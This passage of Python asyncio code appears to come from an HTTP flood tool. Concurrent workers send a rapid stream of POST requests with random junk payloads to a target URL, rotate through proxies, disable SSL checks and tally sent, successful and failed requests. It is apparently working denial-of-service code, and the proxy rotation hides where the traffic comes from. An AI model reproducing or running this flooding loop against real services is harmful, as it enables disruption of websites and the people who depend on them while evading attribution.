                        "Accept": "*/*",
                        "Connection": "close",
                    }
                    payload = f"data={random.randbytes(64).hex()}&id={random.randint(1,999999)}"
                    try:
                        kwargs = {"headers": headers, "data": payload, "ssl": False}
                        if proxy:
                            kwargs["proxy"] = f"http://{proxy}"
                        async with session.post(url, **kwargs) as resp:
                            await resp.release()
                            self._inc("sent")
                            self._track_proxy(proxy)
                            if resp.status < 500:
                                self._inc("success")
                            else:
                                self._inc("fail")
                    except Exception:
                        self._inc("fail")
                    await asyncio.sleep(0.01)

            tasks = [asyncio.create_task(worker()) for _ in range(concurrency)]
            try:
                await asyncio.gather(*tasks, return_exceptions=True)
            finally:
                self.running = False
                for t in tasks:
                    if not t.done():
                        t.cancel()
                await asyncio.gather(*tasks, return_exceptions=True)
                await session.close()
                await connector.close()
                await asyncio.sleep(0.05)

